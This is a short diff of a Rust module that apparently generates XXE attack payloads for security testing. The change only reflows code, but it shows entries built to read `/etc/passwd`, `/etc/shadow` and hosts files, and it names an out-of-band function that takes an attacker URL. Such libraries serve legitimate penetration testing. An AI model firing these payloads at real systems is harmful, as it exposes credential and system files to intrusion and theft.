@@ -104,9 +104,21 @@ pub fn oob_dtd(attacker_url: &str) -> String {
 /// Common file read payloads
 pub fn common_file_reads() -> Vec<XxePayload> {
     vec![
-        XxePayload::new("Linux passwd", file_read_xxe("/etc/passwd"), XxeCategory::FileRead),
-        XxePayload::new("Linux shadow", file_read_xxe("/etc/shadow"), XxeCategory::FileRead),
-        XxePayload::new("Linux hosts", file_read_xxe("/etc/hosts"), XxeCategory::FileRead),
+        XxePayload::new(
+            "Linux passwd",
+            file_read_xxe("/etc/passwd"),
+            XxeCategory::FileRead,
+        ),
+        XxePayload::new(
+            "Linux shadow",
+            file_read_xxe("/etc/shadow"),
+            XxeCategory::FileRead,
+        ),
+        XxePayload::new(
+            "Linux hosts",
+            file_read_xxe("/etc/hosts"),
+            XxeCategory::FileRead,
+        ),
         XxePayload::new(
             "Windows hosts",
             file_read_xxe("C:/Windows/System32/drivers/etc/hosts"),
